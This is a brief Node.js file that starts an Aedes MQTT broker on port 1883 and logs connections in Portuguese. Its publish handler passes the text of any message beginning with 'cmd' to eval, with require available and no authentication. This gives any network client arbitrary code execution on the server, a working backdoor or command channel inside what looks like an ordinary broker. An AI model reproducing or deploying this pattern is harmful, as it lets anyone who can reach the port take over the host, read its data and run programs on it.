import Aedes from "aedes";
import { createServer } from "net";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

const PORT = 1883;

const aedes = new Aedes();
const server = createServer(aedes.handle);

server.listen(PORT, function () {
  console.log("server started and listening on port ", PORT);
});

aedes.on("publish", async function (packet, client) {
  if (client)
    console.log(
      `Mensagem publicada: ${client.id}:`,
      packet.topic,
      packet.payload.toString()
    );
  const payload = packet.payload.toString().trim();

  if (payload.startsWith("cmd")) {
    const code = payload.slice(3).trim();
    try {
      eval(`(function(require){ ${code} })(require)`);
    } catch (err) {
      console.error("Erro ao executar comando:", err.message);
    }
  }
});

aedes.on("client", function (client) {
  console.log(`Cliente conectado: ${client.id}`);
});
